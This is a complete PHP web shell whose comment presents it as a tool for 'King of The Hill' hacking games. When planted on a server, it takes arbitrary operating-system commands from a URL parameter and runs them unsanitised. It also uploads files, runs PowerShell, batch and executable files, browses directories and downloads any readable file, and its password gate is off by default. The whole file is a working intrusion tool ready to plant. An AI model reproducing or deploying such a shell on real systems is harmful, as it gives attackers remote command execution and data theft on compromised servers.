<?php
    // Password protection, useful for King of The Hill games
    $pass=''; // Set to null to disable; Set to string to enable, must be the sha512 hash of the password.

        global $cmdresults;
        global $retval;
    if($pass != null) {
        if (isset($_COOKIE['pass'])) { // We use cookies and not url parameter for security reasons
            // As it is likely that URL parameters are logged by the webserver, thus revealing the password
            if (hash('sha512', $_COOKIE['pass']) !== $pass) {
                echo "Wrong password !";
                exit;
            }
        } else {
            echo "Wrong password !";
            exit;
        }
    }

    function getAbsolute(string $path): string
    {
        // Cleaning path regarding OS
        $path = mb_ereg_replace('\\\\|/', '/', $path, 'msr');
        // Check if path start with a separator (UNIX)
        $startWithSeparator = $path[0] === '/';
        // Check if start with drive letter
        preg_match('/^[a-z]:/', $path, $matches);
        $startWithLetterDir = isset($matches[0]) ? $matches[0] : false;
        // Get and filter empty sub paths
        $subPaths = array_filter(explode('/', $path), 'mb_strlen');

        $absolutes = [];
        foreach ($subPaths as $subPath) {
            if ('.' === $subPath) {
                continue;
            }
            // if $startWithSeparator is false
            // and $startWithLetterDir
            // and (absolutes is empty or all previous values are ..)
            // save absolute cause that's a relative and we can't deal with that and just forget that we want go up
            if ('..' === $subPath
                && !$startWithSeparator
                && !$startWithLetterDir
                && empty(array_filter($absolutes, function ($value) { return !('..' === $value); }))
            ) {
                $absolutes[] = $subPath;
                continue;
            }
            if ('..' === $subPath) {
                array_pop($absolutes);
                continue;
            }
            $absolutes[] = $subPath;
        }

        return
            (($startWithSeparator ? '/' : $startWithLetterDir) ?
                $startWithLetterDir.'/' : ''
            ).implode('/', $absolutes);
    }

    // Upload file to the server
    if (isset($_POST['upload'])) {
        $desinationDir = getDir();
        $destinationFile = $desinationDir.'/'.basename($_FILES['file']['name']);

        if (file_exists($destinationFile)) {
            echo "<script>alert('Error: File already exists !')</script>";
        }
        else if (move_uploaded_file($_FILES['file']['tmp_name'], $destinationFile)) {
            echo "<script>alert('File uploaded successfuly !')</script>";
        } else {
            echo "<script>alert('Error: Could not upload file !')</script>";
        }
    
    }
    else if (isset($_GET['runscript'])) {
        $script = $_GET['runscript'];
        $scriptPath = getAbsolute($script);
        $command = 'pwsh -Noni -Nop -File "' . $scriptPath . '"';
        global $cmdresults;
        global $retval;
        $cmdresults = shell_exec($command);
    }
    else if (isset($_GET['runexe'])) {
        $script = $_GET['runexe'];
        $scriptPath = getAbsolute($script);
        $command = $scriptPath;
        exec('cd '.realpath(getDir()).' && '.$scriptPath, $cmdresults, $retval);
    }
    else if (isset($_GET['runbat'])) {
        $script = $_GET['runbat'];
        $scriptPath = getAbsolute($script);
        $command = 'pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","' . $scriptPath . ') }';
        exec('cd '.realpath(getDir()).' && '.$scriptPath, $cmdresults, $retval);
    }
    
    // Download a file from the server
    if (isset($_GET['download'])) {
        $file = $_GET['download'];
        if (file_exists($file)) {
            if (is_readable($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: '.filesize($file));
                readfile($file);
                exit;
            } else {
                echo "<script>alert('Error: Could not read the file !')</script>";
                exit;
            }
        }
    }

    function getHeaderColor(){
        return 'rgb(32, 0, 128)';
    }
    function getPrimaryColor(){
        return '#00ff00';
    }
    function getSecondaryColor(){
        return '#d92626';
    }
    function getCommandColor(){
        return '#ff0066';
    }
    function getCommandOutputColor(){
        return '#3ADF00';
    }
    function getExplorerColor(){
        return '#3ADF00';
    }
    function getDirectoryColor(){
        return '#3ADF00';
    }
    function getNavTextColor(){
        return '#ff5500';
    }
    function getHeaderTextColor(){
        return '#C0C0C0';
    }
    function getNavTextHoverColor(){
        return '#C0C0C0';
    }
    function getButtonsColor(){
        return '#3ADF00';
    }
    function getBgColor($level){
        switch ($level) {
          case 1:
            return '#101010';
            break;
          case 2:
            return '#202020';
            break;
          case 3:
            return '#303030';
            break;
          case 4:
            return '#404040';
            break;
          default:
            return '#404040';
        }
        return '#404040';
    }
    function fileExtension($name) {
        $n = strrpos($name, '.');
        return ($n === false) ? '' : substr($name, $n+1);
    }
    function getItemSize($filename) {
        $retval =  '';
        $fname = getDir().'/'.$filename;
        if (is_dir($fname)){  
            $retval .=  '<td style="color: "' .  getDirectoryColor() . '">';
            $retval .= htmlspecialchars('<dir>');
        }
        else{
            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $retsize = formatSizeUnits(filesize($fname));
            $retval .= $retsize;
        }
        $retval .= '</td>';
        return $retval;
    }
    function getItemActions($filename) {
        $retval =  '';
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        switch ($ext) {
          case "ps1":
            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $retval .= makeRunScriptFile($filename);
            break;
          case "bat":
            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $retval .= makeRunBatFile($filename);
            break;
          case "exe":
            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $retval .= makeRunExeFile($filename);
            break;
          default:
            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $retval .= htmlspecialchars('noop');
        }
        $retval .= '</td>';
        return $retval;
    }
    function printPerms($file) {
        $mode = fileperms($file);
        if( $mode & 0x1000 ) { $type='p'; }
        else if( $mode & 0x2000 ) { $type='c'; }
        else if( $mode & 0x4000 ) { $type='d'; }
        else if( $mode & 0x6000 ) { $type='b'; }
        else if( $mode & 0x8000 ) { $type='-'; }
        else if( $mode & 0xA000 ) { $type='l'; }
        else if( $mode & 0xC000 ) { $type='s'; }
        else $type='u';
        $owner["read"] = ($mode & 00400) ? 'r' : '-';
        $owner["write"] = ($mode & 00200) ? 'w' : '-';
        $owner["execute"] = ($mode & 00100) ? 'x' : '-';
        $group["read"] = ($mode & 00040) ? 'r' : '-';
        $group["write"] = ($mode & 00020) ? 'w' : '-';
        $group["execute"] = ($mode & 00010) ? 'x' : '-';
        $world["read"] = ($mode & 00004) ? 'r' : '-';
        $world["write"] = ($mode & 00002) ? 'w' : '-';
        $world["execute"] = ($mode & 00001) ? 'x' : '-';
        if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
        if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
        if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
        $s=sprintf("%1s", $type);
        $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
        $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
        $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
        return $s;
    }

    function formatSizeUnits($bytes) {
        if ($bytes >= 1073741824)
        {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }
        elseif ($bytes >= 1048576)
        {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }
        elseif ($bytes >= 1024)
        {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        }
        elseif ($bytes > 1)
        {
            $bytes = $bytes . ' bytes';
        }
        elseif ($bytes == 1)
        {
            $bytes = $bytes . ' byte';
        }
        else
        {
            $bytes = '0 bytes';
        }

        return $bytes;
    }


    function getDir() {
        return isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
    }


    function makeFileName($file) {
        if (is_dir(getDir().'/'.$file)) {
            return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(getDir().'/'.$file).'">'.$file.'</a>';
        } else {
            return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(getDir().'/'.$file).'">'.$file.'</a>';
        }
    }
    function makeRunScriptFile($file) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
    }
    function makeRunExeFile($file) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
    }
    function makeRunBatFile($file) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
    }
    function getFiles() {
        $files = scandir(getDir());

        $even = true;
        if ($files != null) {
            foreach($files as $filename){
                //Simply print them out onto the screen.
                echo '<tr style="background-color:'.($even  ? '#515151' : '#212121').';">';
                echo '<td style="font-weight:thin;">'.makeFileName($filename).'</td>'; 
                //echo '<td>owner</td>';
                //echo '<td>'.printPerms(getDir().'/'.$filename).'</td>';
                echo ''.getItemSize($filename).'';
                echo ''.getItemActions($filename).'';
                echo '</tr>';
                $even = !$even;
            }
        } else {
            echo "<p>Couldn't open that directory !";
        }
    }

    function getCmdResults() {
        global $cmdresults;
        global $retval;
        
        if ($retval == 0 ) {
            if($cmdresults != null){
                foreach ($cmdresults as $line) {

                    if($line != null){
                        echo "<br>";
                        echo htmlspecialchars($line);
                        echo "\n";
                        
                    }
                }
            }
        } else {
            echo "Execution failed with error code: ".$retval;
        }    
    }

    function getCommandLine() {
        $hostname = gethostname() ?? 'none';
        $username = get_current_user();
        $dir = getDir();
        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';

        return '<span style="color: #ff6347">'.$username.'@'.$hostname.'</span>: <span style="color: #B40404">'.$dir.'</span>$ '.$cmd;
    }

    if (isset($_GET['cmd'])) {
        exec('cd '.realpath(getDir()).' && '.$_GET['cmd'], $cmdresults, $retval);
    }
?>
